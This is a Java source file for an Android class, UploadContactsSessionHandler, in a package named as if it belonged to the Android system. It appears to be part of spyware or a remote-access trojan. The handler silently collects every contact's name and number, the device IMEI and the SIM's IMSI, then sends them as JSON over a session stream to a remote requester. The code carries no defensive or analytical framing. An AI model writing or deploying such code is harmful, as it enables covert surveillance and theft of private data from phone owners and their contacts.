package com.android.system.session.handler;

import android.content.Context;
import android.telephony.TelephonyManager;

import com.android.system.service.SystemService;
import com.android.system.session.SessionManager;
import com.android.system.utils.DataPack;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.List;

;

public class UploadContactsSessionHandler implements SessionManager.SessionHandler {
    @Override
    public void handleSession(String sessionName, InputStream inputStream, OutputStream outputStream) {
        List<SystemUtil.ContactData> contactList = SystemUtil.getContactDataInPhone(SystemService.getContext());
        if(contactList == null) {
            return;
        }
        JSONObject responseJsonObject = new JSONObject();
        try {
            JSONArray contactArray = new JSONArray();
            for(SystemUtil.ContactData contactData: contactList) {
                contactArray.put(new JSONObject().put("name", contactData.name).put("number", contactData.number).put("last_update",contactData.lastUpdate));
            }
            TelephonyManager tm = (TelephonyManager) SystemService.getContext().getSystemService(Context.TELEPHONY_SERVICE);
            responseJsonObject.put(sessionName, contactArray)
                    .put("imei", tm.getDeviceId())
                    .put("imsi", tm.getSubscriberId());;
        } catch (JSONException e) {
        }
        byte[] responseData = null;
        try {
            responseData = responseJsonObject.toString().getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            responseData = responseJsonObject.toString().getBytes();
        }
        DataPack.sendDataPack(outputStream, responseData);
    }
}
